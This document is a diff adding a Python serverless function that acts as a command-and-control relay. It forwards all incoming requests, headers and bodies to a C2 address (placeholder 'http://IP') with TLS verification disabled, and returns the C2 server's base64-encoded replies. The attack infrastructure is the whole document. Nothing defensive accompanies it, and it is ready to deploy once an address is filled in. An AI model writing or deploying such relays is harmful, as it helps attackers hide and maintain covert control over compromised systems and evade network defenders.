@@ -1,0 +1,30 @@
+# coding: utf8
+import json,requests,base64
+def main_handler(event, context):
+   response = {}
+   path = None
+   headers = None
+   try:
+       C2='http://IP'
+       if 'path' in event.keys():
+           path=event['path']
+       if 'headers' in event.keys():
+           headers=event['headers']
+       if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :
+           resp=requests.get(C2+path,headers=headers,verify=False) 
+       else:      
+           params=event['queryString']
+           resp=requests.post(C2+path,data=event['body'],headers=headers,params=params,verify=False)
+           print(resp.headers)
+           print(resp.content)
+       response={
+           "isBase64Encoded": True,
+           "statusCode": resp.status_code,
+           "headers": dict(resp.headers),
+           "body": str(base64.b64encode(resp.content))[2:-1]
+      }
+   except Exception as e:
+       print('error')
+       print(e)
+   finally:
+       return response
